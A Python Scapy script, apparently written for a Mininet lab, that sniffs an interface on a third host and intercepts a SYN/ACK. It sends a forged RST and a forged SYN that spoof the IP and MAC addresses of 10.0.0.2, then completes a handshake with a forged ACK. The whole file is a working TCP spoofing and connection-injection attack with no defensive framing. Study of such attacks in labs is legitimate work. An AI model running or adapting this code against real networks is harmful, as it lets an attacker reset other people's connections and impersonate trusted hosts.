from scapy.all import *
import logging

logging.basicConfig(format='%(levelname)s: %(message)s', filename='scapy.log',level=logging.DEBUG)

# Bitmasks for each flag
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

# filter for packets we capture
def isNotOutgoing(pkt):
    return pkt[Ether].src != "00:00:00:00:00:03"


first_synack = True

# Actions to take when a packet is received
def pkt_callback(pkt):
    global first_synack
    if pkt.haslayer(TCP):
        # print(pkt.show())
        # When we get the synack, send rst to server and new syn
        if pkt[TCP].flags & SYN and pkt[TCP].flags & ACK:
            logging.info("Intercepted a SYN/ACK")
            
            # rst_pkt = pkt
            # del rst_pkt[IP].chksum
            # del rst_pkt[TCP].chksum
            # del rst_pkt[TCP].ack
            # del rst_pkt[TCP].options
            if first_synack: 
                logging.info("Sending RST packet..")
                first_synack = False
                rst_pkt = Ether()/IP()/TCP()
                rst_pkt[TCP].window = 0
                rst_pkt[TCP].sport = pkt[TCP].dport
                rst_pkt[TCP].dport = pkt[TCP].sport
                rst_pkt[TCP].flags = "R"
                # rst_pkt[TCP].ack = 1
                del rst_pkt[TCP].ack
                rst_pkt[IP].src = "10.0.0.2"
                rst_pkt[IP].dst = "10.0.0.1"
                rst_pkt[Ether].src = "00:00:00:00:00:02"
                rst_pkt[Ether].dst = "00:00:00:00:00:01"
                rst_pkt[TCP].seq = 1
                logging.info(rst_pkt.summary())
                sendp(rst_pkt, iface = 'h3-eth0')

                # create the new packet with changed sequence number
                logging.info("Sending new SYN packet..")
                new_pkt = rst_pkt
                del new_pkt[TCP].ack
                del new_pkt[TCP].chksum
                new_pkt[TCP].window = pkt[TCP].window
                new_pkt[TCP].flags = SYN
                new_pkt[TCP].sport = 45800
                new_pkt[TCP].seq = 0
                logging.info(new_pkt.summary())
                sendp(new_pkt, iface = 'h3-eth0')
            else:
                logging.info("Sending ack in response to second SYN/ACK...")
                ack_pkt = Ether()/IP()/TCP()
                ack_pkt[TCP].window = pkt[TCP].window
                ack_pkt[TCP].seq = 1
                ack_pkt[TCP].sport = pkt[TCP].dport
                ack_pkt[TCP].dport = pkt[TCP].sport
                ack_pkt[TCP].flags = "A"
                ack_pkt[TCP].ack = pkt[TCP].seq + 1
                ack_pkt[IP].src = "10.0.0.2"
                ack_pkt[IP].dst = "10.0.0.1"
                ack_pkt[Ether].src = "00:00:00:00:00:02"
                ack_pkt[Ether].dst = "00:00:00:00:00:01"
                sendp(ack_pkt, iface = 'h3-eth0')
                logging.info(ack_pkt.summary())
                print(ack_pkt.show())
                

sniff(iface="h3-eth0", prn=pkt_callback, store=0, lfilter=isNotOutgoing)
